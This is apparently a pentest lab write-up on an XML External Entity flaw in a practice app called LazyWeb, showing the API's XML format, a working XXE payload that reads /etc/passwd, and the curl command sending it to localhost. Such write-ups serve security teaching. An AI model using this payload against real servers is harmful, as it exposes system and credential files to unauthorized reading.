---
title: "LazyWeb – VULN 5: XML External Entity (XXE) Injection"
date: 2026-04-14
categories: [Writeups, WebPentest]
tags: [web security, pentesting, owasp, burp suite, vulnerability]
description: Identification and exploitation of an XXE vulnerability in LazyWeb, enabling access to sensitive files and potential disclosure of internal system information.
image: /assets/img/lazyweb-cover.png
---
## Description

The application provides an API endpoint that accepts XML data for user authentication. The XML parser used by the application processes external entities without proper validation.

Because external entity processing is enabled, an attacker can define a malicious XML entity that references sensitive files on the server. When the XML document is processed, the server resolves the entity and returns the file contents in the response.

This allows attackers to read sensitive files from the server, leading to **information disclosure**.

## Discovery Process

### Step 1 — Identify API Documentation

While exploring the application interface, an **API documentation page** was discovered:

![/assets/img/imgvuln5.png](/assets/img/imgvuln5.png)

The documentation reveals that the API endpoint accepts XML data:

```xml
<creds>
<user>Ed</user>
<pass>mypass</pass>
</creds>
```

This indicates that the API processes **XML input**, which may be vulnerable to XML-based attacks such as XXE.

### Step 2 — Craft Malicious XML Payload

To test for XXE vulnerabilities, a malicious XML payload was crafted that defines an external entity referencing a local system file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```

The payload attempts to read the `/etc/passwd` file from the server.

### Step 3 — Send the Payload

The payload was sent using `curl`:

```xml
curl -X POST [http://localhost/user/api.php](http://localhost/user/api.php) \
-H "Content-Type: application/xml" \
-d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>'
```

## Proof of Concept (PoC)

The server response contained the contents of the `/etc/passwd` file:

![/assets/img/imgvuln5(1).png](/assets/img/imgvuln5(1).png)

This confirms that the external entity was successfully resolved by the XML parser.

## Impact

Successful exploitation of this vulnerability allows attackers to:

- Read sensitive files from the server
- Perform system enumeration
- Access configuration files
- Potentially obtain credentials or secrets

## Severity

<span style="color: #ff922b;">**High**</span>

This vulnerability allows attackers to read sensitive files directly from the server.